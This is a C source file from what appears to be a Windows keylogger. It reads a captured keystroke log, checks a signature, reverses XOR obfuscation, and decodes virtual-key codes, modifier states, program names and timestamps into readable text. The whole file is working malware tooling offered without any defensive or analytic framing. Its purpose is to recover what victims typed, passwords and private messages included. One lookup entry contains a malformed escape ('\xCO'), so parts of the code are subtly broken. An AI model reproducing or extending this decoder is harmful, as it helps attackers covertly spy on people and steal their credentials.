#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>
#include <windows.h>
#include "types.h"
#include "keylogger.h"
#include "logger.h"

#define KEYLOGGER_DATA_NUMPAD_MIN 0x60
#define KEYLOGGER_DATA_NUMPAD_MAX 0x6F
#define KEYLOGGER_DATA_SPEC_LEN 10
#define KEYLOGGER_DATA_OTHER_LEN 12

#define KEYLOGGER_BUILD_RV(R) (ctrl & 0xFF) << 8 | (R & 0xFF)

char* keylogger_data_09 = ")!@#$%^&*(\0";
char* keylogger_data_numpad = "0123456789\0";
uint8* keylogger_data_spec[KEYLOGGER_DATA_SPEC_LEN] = { (uint8*)"\x08 BACK", (uint8*)"\x09 TAB", (uint8*)"\x0D ENTR", (uint8*)"\x1B ESC", (uint8*)"\x23 END", (uint8*)"\x24 HOME", (uint8*)"\x25 LEFT", (uint8*)"\x26 UP", (uint8*)"\x27 RIGHT", (uint8*)"\x28 DOWN" };
uint8* keylogger_data_other[KEYLOGGER_DATA_OTHER_LEN] = { (uint8*)"\xCO`~", (uint8*)"\xBD-_", (uint8*)"\xBB=+", (uint8*)"\xD8[{", (uint8*)"\xDD]}", (uint8*)"\xBA;:", (uint8*)"\xDE\'\"", (uint8*)"\xDC\\|", (uint8*)"\xE2\\|", (uint8*)"\xBC,<", (uint8*)"\xBE.>", (uint8*)"\xBF/?" };

int keylogger_DecodeKey(uint16 data, OUT_STR key, int keyLen)
{
	if(keyLen < 2)
	{
		return 0;
	}

	uint8 vk = ((data >> 8) & 0xFF);

	char ctrl = 0;
	char shift = 0;
	char caps = 0;

	if((data >> KEYLOGGER_TABLE_CTRL) & 0x1)
	{
		ctrl = 'C';
	}

	if((data >> KEYLOGGER_TABLE_SHIFT) & 0x1)
	{
		shift = 1;
	}

	if((data >> KEYLOGGER_TABLE_CAPS_LOCK) & 0x1)
	{
		caps = 1;
	}

	int toUpper = 0;
	char* rbuff = key;
	
	if(shift && caps)
	{
		toUpper = 0;
	}else if(shift || caps){
		toUpper = 1;
	}

	if(vk >= 'A' && vk <= 'Z')
	{
		if(!toUpper)
		{
			vk += 0x20;
		}

		rbuff[0] = vk;

		return KEYLOGGER_BUILD_RV(KEYLOGGER_RV_NORMAL);
	}

	if(vk >= '0' && vk <= '9')
	{
		if(shift)
		{
			vk = keylogger_data_09[vk - '0'];
		}

		rbuff[0] = vk;
		
		return KEYLOGGER_BUILD_RV(KEYLOGGER_RV_NORMAL);
	}

	if(vk == VK_SPACE)
	{
		rbuff[0] = ' ';

		return KEYLOGGER_BUILD_RV(KEYLOGGER_RV_NORMAL);
	}

	if(vk >= KEYLOGGER_DATA_NUMPAD_MIN && vk <= KEYLOGGER_DATA_NUMPAD_MAX)
	{
		rbuff[0] = keylogger_data_numpad[vk - KEYLOGGER_DATA_NUMPAD_MIN];

		return KEYLOGGER_BUILD_RV(KEYLOGGER_RV_NORMAL);
	}

	int i;

	for(i = 0; i != KEYLOGGER_DATA_OTHER_LEN; i++)
	{
		if(vk == keylogger_data_other[i][0])
		{
			if(shift)
			{
				rbuff[0] = keylogger_data_other[i][2];
			}else{
				rbuff[0] = keylogger_data_other[i][1];
			}

			return KEYLOGGER_BUILD_RV(KEYLOGGER_RV_NORMAL);
		}
	}

	for(i = 0; i != KEYLOGGER_DATA_SPEC_LEN; i++)
	{
		if(vk == keylogger_data_spec[i][0])
		{
			strncpy(rbuff, (char*)keylogger_data_spec[i] + 2, keyLen);

			return KEYLOGGER_BUILD_RV(KEYLOGGER_RV_SPEC);
		}
	}

	return 0;
}

int keylogger_DecodeFile(char* flog, char* fout)
{
	FILE *fl = fopen(flog, "rb");

	if(!fl)
	{
		LOG(LOG_ERR, "Failed to open \"%s\"!", flog);

		return 0;
	}

	FILE *fo = fopen(fout, "w");

	if(!fo)
	{
		LOG(LOG_ERR, "Failed to create \"%s\"!", fout);
		fclose(fl);
		
		return 0;
	}

	fseek(fl, 0, SEEK_END);
	uint32 fsize = ftell(fl);
	fseek(fl, 0, SEEK_SET);

	if(fsize < KEYLOGGER_SIGIL_LEN + 4) //SIGIL + XORKEY + KEY DATA
	{
		LOG(LOG_ERR, "Emptry file!");
		fclose(fo);
		fclose(fl);

		return 0;
	}

	fsize--;

	uint32 i;
	uint8 sigilCheck[KEYLOGGER_SIGIL_LEN];
	memset(sigilCheck, 0, KEYLOGGER_SIGIL_LEN);
	fread(sigilCheck, 1, KEYLOGGER_SIGIL_LEN, fl);

	if(memcmp(sigilCheck, KEYLOGGER_SIGIL, KEYLOGGER_SIGIL_LEN) != 0)
	{
		LOG(LOG_ERR, "Invalid format!");
		fclose(fo);
		fclose(fl);

		return 0;
	}

	uint8 rbyte = 0x0;
	uint8 xorKey = 0x0;
	uint8 cmd = 0x0;

	for(i = KEYLOGGER_SIGIL_LEN; i <= fsize; i++)
	{
		rbyte = fgetc(fl);

		if(rbyte == KEYLOGGER_CMD_XOR_KEY)
		{
			xorKey = fgetc(fl);
			i++;

			fprintf(fo, "\n-> New xor: 0x%X\n", xorKey);
			
			continue;
		}

		if(xorKey)
		{
			rbyte ^= xorKey;
		}
	
		cmd = (rbyte & 0xF) & 0xFF;
		
		if(cmd == KEYLOGGER_CMD_PRG)
		{
			int len = fgetc(fl);

			if(xorKey)
			{
				len ^= xorKey;
			}

			int y;
			uint8 ch;

			fprintf(fo, "\n-> New task: ");

			for(y = 0; y != len; y++)
			{
				ch = fgetc(fl);

				if(xorKey)
				{
					ch ^= xorKey;
				}

				fputc(ch, fo);
			}

			fputs("\n", fo);
		}else if(cmd == KEYLOGGER_CMD_TIME){
			uint8 _time[4];
			fread(_time, 1, 4, fl);

			if(xorKey)
			{
				_time[0] ^= xorKey;
				_time[1] ^= xorKey;
				_time[2] ^= xorKey;
				_time[3] ^= xorKey;
			}

			long tim = (_time[0] & 0xFF) | ((_time[1] & 0xFF) << 8) | ((_time[2] & 0xFF) << 16) | ((_time[3] & 0xFF) << 24);

			if(tim)
			{
				fprintf(fo, "\n-> Time: %s", ctime(&tim));
			}
		}else if(cmd == KEYLOGGER_CMD_KEY){
			uint16 kdata = rbyte;
			uint8 kk = fgetc(fl);
			i++;

			if(xorKey)
			{
				kk = kk ^ xorKey;
			}

			kdata |= (kk & 0xFF) << 8;

			char kbuff[0xF];
			memset(kbuff, 0, 0xF);

			int rdec = keylogger_DecodeKey(kdata, kbuff, 0xF);

			if(rdec)
			{
				if(KEYLOGGER_IS_CTRL_ON(rdec))
				{
					fprintf(fo, "{CTRL + %s}", kbuff);
				}else if(rdec == KEYLOGGER_RV_SPEC){
					fprintf(fo, "{ %s }", kbuff);
				}else{
					fprintf(fo, "%s", kbuff);
				}
			}

			continue;
		}
	}

	fclose(fo);
	fclose(fl);

	return 1;
}
